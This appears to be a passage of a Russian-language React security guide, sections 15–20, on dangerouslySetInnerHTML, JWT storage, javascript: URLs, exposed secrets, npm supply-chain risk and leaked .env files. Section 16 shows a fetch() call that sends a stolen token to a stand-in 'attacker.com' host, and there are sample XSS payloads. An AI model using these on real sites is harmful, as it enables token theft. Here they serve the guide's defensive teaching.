### 15: dangerouslySetInnerHTML — самый опасный prop в React

React по умолчанию экранирует HTML:

```jsx id="m4u7ow"
<div>{userInput}</div>
```

Даже если пользователь введёт:

```html id="n9h9mp"
<script>alert('hack')</script>
```

➡️ Скрипт НЕ выполнится.

Но проблема появляется здесь:

```jsx id="p2x3ik"
<div dangerouslySetInnerHTML={{ __html: userInput }} />
```

Теперь любой HTML вставляется как есть.

➡️ XSS готов.

---

**Как безопасно:**

Если HTML нужен — очищай его:

```bash id="y89h2w"
npm install dompurify
```

```jsx id="j4z5an"
import DOMPurify from 'dompurify';

<div
  dangerouslySetInnerHTML={{
    __html: DOMPurify.sanitize(userInput)
  }}
/>
```

**Вывод:** `dangerouslySetInnerHTML` называется так не просто так.

---

### 16: Хранение JWT в localStorage — популярная ошибка

Многие делают так:

```js id="f2q8tf"
localStorage.setItem('token', jwt);
```

Проблема:
если случится XSS — токен украдут мгновенно.

```js id="v8l9qj"
fetch('https://attacker.com', {
  method: 'POST',
  body: localStorage.getItem('token')
});
```

---

**Что лучше:**

* HttpOnly cookies
* SameSite cookies
* Secure cookies

Cookie с `HttpOnly`:
➡️ JavaScript не сможет прочитать токен.

---

**Вывод:** localStorage удобен, но небезопасен для auth-токенов.

---

### 17: React ≠ защита от XSS

Есть миф:

> “React автоматически защищает от XSS”

Не всегда.

**Опасный пример:**

```jsx id="x6c0tv"
<a href={user.website}>Site</a>
```

Пользователь может сохранить:

```id="7h1moh"
javascript:alert(1)
```

➡️ При клике выполнится код.

---

**Как защититься:**
Проверяй URL:

```js id="g6n6rt"
const isSafe = url.startsWith('https://');
```

или используй whitelist доменов.

---

**Вывод:** React экранирует HTML, но не валидирует данные.

---

### 18: Секреты в React — секрета нет

**Плохо:**

```env id="8ru5v6"
VITE_API_SECRET=supersecret
```

или:

```js id="p9j7se"
const apiKey = process.env.REACT_APP_SECRET;
```

➡️ Всё попадёт в frontend bundle.

Любой пользователь может открыть DevTools и увидеть ключ.

---

**Важно понимать:**
Frontend-код = публичный код.

---

**Что делать:**

* секреты хранить только на backend
* frontend должен обращаться к API
* использовать proxy/server actions

---

**Вывод:** если секрет оказался в React — это уже не секрет.

---

### 19: Dependency attacks — npm тоже может быть угрозой

Ты ставишь пакет:

```bash id="z8m7nb"
npm install some-package
```

А внутри:

* майнер
* backdoor
* кража env
* вредоносный postinstall script

---

**Что делать:**

Проверяй:

```bash id="h8w4di"
npm audit
```

Используй:

* lockfile
* trusted packages
* минимальное количество зависимостей

И не ставь пакет с:

```id="vrq3q3"
5 downloads/week
```

---

**Вывод:** безопасность проекта зависит и от твоих зависимостей.

---

###  20: .env в GitHub — утечка за 5 секунд

Одна из самых частых ошибок:

```bash id="6byrmq"
git add .env
git push
```

Через пару минут:

* ключи индексируются ботами
* API-ключи начинают использовать
* аккаунты компрометируются

---

**Правильно:**
`.gitignore`

```gitignore id="v6l5s9"
.env
```

И отдельно:

```bash id="ux2c44"
.env.example
```

---

Если секрет уже утёк:

1. Немедленно перевыпусти ключ
2. Удали секрет из git history
3. Проверь логи доступа

---

**Вывод:** утечка `.env` — это не “если”, а “когда”, если не настроить gitignore.
